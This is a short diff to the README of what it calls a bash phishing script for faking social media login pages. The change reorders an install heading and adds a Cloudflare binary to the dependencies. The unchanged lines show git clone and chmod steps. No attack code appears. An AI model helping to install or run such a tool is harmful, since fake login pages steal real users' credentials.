@@ -2,10 +2,9 @@
 
 ***A bash phishing script for phishing login social media pages***
 
+### [+] Install primary dependencies (git, bash, cloudflare Binary)
+
 ### [+] Installation
-
-### [+] Install primary dependencies (git, bash)
-
  - For Debian (Kali-Linux)
     - ``` git clone ```
     - ``` chmod +x phish-decoded.sh ```
